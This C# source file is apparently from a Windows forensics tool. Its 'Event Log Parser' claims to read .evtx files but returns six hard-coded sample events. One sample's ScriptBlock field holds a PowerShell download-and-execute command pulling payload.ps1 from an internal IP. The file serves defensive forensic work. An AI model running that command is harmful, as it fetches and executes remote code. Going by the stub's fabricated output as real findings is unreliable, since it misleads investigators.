using MickyAc.Domain.Enums;
using MickyAc.Domain.Interfaces;
using MickyAc.Domain.Models;

namespace MickyAc.Infrastructure.Parsers.EventLog;

public class EventLogParser : IForensicParser
{
    public ArtifactType ArtifactType => ArtifactType.EventLog;
    public string Name => "Event Log Parser";
    public string Description => "Parses Windows Event Log files (.evtx) to extract security, system, application, and PowerShell events for forensic analysis.";

    public Task<List<TimelineEvent>> ParseAsync(string path, CancellationToken ct = default)
    {
        var events = new List<TimelineEvent>();
        var now = DateTime.UtcNow;

        events.Add(new TimelineEvent
        {
            Timestamp = now.AddDays(-14).AddHours(-3),
            SourceType = ArtifactType.EventLog,
            SourceName = Name,
            EventType = "SecurityEvent",
            Description = "User account successfully logged on with administrative privileges",
            FilePath = Path.Combine(path, "Security.evtx"),
            User = "CONTOSO\\administrator",
            Hash = null,
            RiskLevel = RiskLevel.Medium,
            Metadata = new Dictionary<string, string>
            {
                { "EventID", "4624" },
                { "LogonType", "2" },
                { "LogonProcess", "User32" },
                { "SourceIP", "192.168.1.100" },
                { "TargetSID", "S-1-5-21-123456789-123456789-123456789-500" }
            }
        });

        events.Add(new TimelineEvent
        {
            Timestamp = now.AddDays(-10).AddHours(-7),
            SourceType = ArtifactType.EventLog,
            SourceName = Name,
            EventType = "SystemEvent",
            Description = "System event log indicates service start failure with error code 0x80004005",
            FilePath = Path.Combine(path, "System.evtx"),
            User = "SYSTEM",
            Hash = null,
            RiskLevel = RiskLevel.Low,
            Metadata = new Dictionary<string, string>
            {
                { "EventID", "7000" },
                { "ServiceName", "wuauserv" },
                { "ErrorCode", "0x80004005" },
                { "Source", "Service Control Manager" }
            }
        });

        events.Add(new TimelineEvent
        {
            Timestamp = now.AddDays(-5).AddHours(-1),
            SourceType = ArtifactType.EventLog,
            SourceName = Name,
            EventType = "ApplicationEvent",
            Description = "Application error in svchost.exe with exception code 0xc0000005",
            FilePath = Path.Combine(path, "Application.evtx"),
            User = "SYSTEM",
            Hash = null,
            RiskLevel = RiskLevel.Medium,
            Metadata = new Dictionary<string, string>
            {
                { "EventID", "1000" },
                { "ApplicationName", "svchost.exe" },
                { "ExceptionCode", "0xc0000005" },
                { "FaultingModule", "ntdll.dll" }
            }
        });

        events.Add(new TimelineEvent
        {
            Timestamp = now.AddDays(-3).AddHours(-12),
            SourceType = ArtifactType.EventLog,
            SourceName = Name,
            EventType = "PowerShellCommand",
            Description = "PowerShell script block logging detected suspicious command execution",
            FilePath = Path.Combine(path, "Windows PowerShell.evtx"),
            User = "CONTOSO\\jsmith",
            Hash = null,
            RiskLevel = RiskLevel.High,
            Metadata = new Dictionary<string, string>
            {
                { "EventID", "4104" },
                { "ScriptBlock", "Invoke-Expression -Command (New-Object Net.WebClient).DownloadString('http://10.0.0.5/payload.ps1')" },
                { "ScriptBlockId", "6a1b2c3d-4e5f-6789-0abc-def012345678" },
                { "Path", "C:\\Users\\jsmith\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt" }
            }
        });

        events.Add(new TimelineEvent
        {
            Timestamp = now.AddDays(-1).AddHours(-6),
            SourceType = ArtifactType.EventLog,
            SourceName = Name,
            EventType = "ScheduledTaskEvent",
            Description = "Scheduled task triggered from Security log: task created by administrator for persistence",
            FilePath = Path.Combine(path, "Security.evtx"),
            User = "CONTOSO\\administrator",
            Hash = null,
            RiskLevel = RiskLevel.Medium,
            Metadata = new Dictionary<string, string>
            {
                { "EventID", "4698" },
                { "TaskName", "\\Microsoft\\Windows\\UpdateOrchestrator\\USO_UxBroker" },
                { "TaskContent", "<?xml version=\"1.0\" encoding=\"UTF-16\"?>" },
                { "Command", "C:\\Windows\\System32\\usoclient.exe" }
            }
        });

        events.Add(new TimelineEvent
        {
            Timestamp = now.AddDays(-0).AddHours(-2),
            SourceType = ArtifactType.EventLog,
            SourceName = Name,
            EventType = "SecurityEvent",
            Description = "Account logon failure with multiple attempts detected - possible brute force attack",
            FilePath = Path.Combine(path, "Security.evtx"),
            User = "CONTOSO\\administrator",
            Hash = null,
            RiskLevel = RiskLevel.High,
            Metadata = new Dictionary<string, string>
            {
                { "EventID", "4625" },
                { "LogonType", "3" },
                { "SourceIP", "203.0.113.50" },
                { "FailureCount", "15" },
                { "TargetUserName", "Administrator" },
                { "Status", "0xc000006d" }
            }
        });

        return Task.FromResult(events);
    }

    public Task<List<TimelineEvent>> ParseAsync(CancellationToken ct = default)
    {
        return ParseAsync(@"C:\Windows\System32\winevt\Logs", ct);
    }

    public bool CanParse(string path)
    {
        if (string.IsNullOrWhiteSpace(path))
            return false;

        var attr = File.GetAttributes(path);
        if (attr.HasFlag(FileAttributes.Directory))
            return path.Equals(@"C:\Windows\System32\winevt\Logs", StringComparison.OrdinalIgnoreCase);

        return path.EndsWith(".evtx", StringComparison.OrdinalIgnoreCase);
    }
}
